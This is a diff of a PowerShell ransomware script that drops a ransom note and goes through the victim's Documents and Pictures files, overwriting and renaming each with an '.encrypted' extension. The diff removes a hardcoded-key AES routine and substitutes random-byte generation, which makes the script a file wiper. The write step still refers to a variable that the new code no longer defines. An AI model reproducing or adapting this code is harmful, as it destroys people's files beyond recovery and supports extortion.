@@ -44,24 +44,6 @@ $notePage = @"
 </html>
 "@
 
-# inspired from https://gist.github.com/PanosGreg/1453e0b0dcaa64e3e02c5cc7b9b43a8c
-function Encrypt {
-    param($in)
-    $key = [System.Text.Encoding]::UTF8.GetBytes("thisisakeythatnoonewillguess!!!1")
-    $aesManaged           = [System.Security.Cryptography.AesManaged]::new()
-    $aesManaged.Mode      = [System.Security.Cryptography.CipherMode]::CBC
-    $aesManaged.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
-    $aesManaged.BlockSize = 128
-    $aesManaged.KeySize   = 256
-    $aesManaged.Key       = $key
-    $aesManaged.IV        = $key[0..15]
-    $encryptor = $aesManaged.CreateEncryptor()
-    $encrypted = $encryptor.TransformFinalBlock($in, 0, $in.Length)
-    $aesManaged.Dispose()
-    
-    return $encrypted
-}
-
 # Drop and show ransom note
 
 $desktopPath = [Environment]::GetFolderPath("Desktop")
@@ -84,8 +66,10 @@ $files = $documents + $pictures
 foreach ($file in $files) {
     $filepath = $file.FullName
     $filename = $file.Name
-    $filecontent = Get-Content -Path $filepath -Encoding Byte
-    $encrypted = Encrypt $filecontent
+    $filelength = $file.Length
+    [System.Security.Cryptography.RNGCryptoServiceProvider] $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
+    $rndbytes = New-Object byte[] $filelength
+    $rng.GetBytes($rndbytes)
     Set-Content -Path $filepath -Encoding Byte -Value $encrypted
     Rename-Item -Path $filepath -NewName "$filename.encrypted"
 }
